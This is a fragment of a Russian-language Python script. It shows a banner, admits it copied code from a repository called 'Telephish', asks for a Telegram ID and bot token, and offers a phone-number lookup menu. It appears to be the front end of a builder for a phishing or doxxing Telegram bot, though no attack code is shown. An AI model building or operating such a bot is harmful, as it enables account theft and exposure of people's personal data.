...
#тот у кого спиздил код: https://github.com/lamer112311/Telephish
...
print(Fore.MAGENTA + '██║░░██║██║╚██████╔╝╚█████╔╝███████╗  ██║░░░░░██║░░██║██║██████╔╝██║░░██║')
print(Fore.MAGENTA + '╚═╝░░╚═╝╚═╝░╚═════╝░░╚════╝░╚══════╝  ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
print(Fore.MAGENTA +      'тот у кого спиздил код: https://github.com/lamer112311/Telephish    ')
userid = input(Fore.RED +  "Введите свой Telegram ID > ")
token = input(Fore.BLUE +  "Введите токен бота > ")
print('Что бы запустить бота откройте фаил probiv который будет сохранен в папку софта')
print(Fore.CYAN + '''
[1] Пробив по номеру
